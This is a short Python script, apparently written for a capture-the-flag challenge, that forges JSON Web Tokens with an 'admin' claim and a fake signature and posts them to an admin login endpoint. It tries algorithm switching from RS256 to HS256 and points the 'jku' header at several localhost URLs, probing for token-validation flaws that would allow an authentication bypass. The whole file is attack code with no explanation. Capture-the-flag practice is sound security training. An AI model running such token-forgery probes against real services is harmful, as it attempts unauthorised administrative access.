import urllib.request
import json
import base64
import time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def test_jwt(header: dict, payload: dict, sig: bytes = b"sig", timeout: int = 10):
    h = b64url(json.dumps(header).encode())
    p = b64url(json.dumps(payload).encode())
    s = b64url(sig)
    token = f"{h}.{p}.{s}"

    req = urllib.request.Request(
        'http://chals.tisc26.ctf.sg:21515/api/v2/admin/login',
        data=json.dumps({'token': token}).encode(),
        headers={'Content-Type': 'application/json'}
    )
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.time() - t0
            print(f"[{elapsed:.2f}s] Header: {header} -> {resp.status} {resp.read().decode()}")
    except urllib.error.HTTPError as e:
        elapsed = time.time() - t0
        print(f"[{elapsed:.2f}s] Header: {header} -> {e.code} {e.read().decode()}")
    except Exception as e:
        elapsed = time.time() - t0
        print(f"[{elapsed:.2f}s] Header: {header} -> Exception: {e}")

if __name__ == "__main__":
    print("Testing...")
    test_jwt({"alg": "RS256", "kid": "key1"}, {"user": "admin"}, timeout=15)
    test_jwt({"alg": "HS256", "kid": "key1"}, {"user": "admin"}, timeout=15)
    test_jwt({"alg": "RS256", "jku": "http://127.0.0.1:21515/", "kid": "key1"}, {"user": "admin"}, timeout=15)
    test_jwt({"alg": "RS256", "jku": "http://127.0.0.1:8000/", "kid": "key1"}, {"user": "admin"}, timeout=15)
    test_jwt({"alg": "RS256", "jku": "http://localhost:21515/", "kid": "key1"}, {"user": "admin"}, timeout=15)
    test_jwt({"alg": "RS256", "jku": "invalid_url", "kid": "key1"}, {"user": "admin"}, timeout=15)
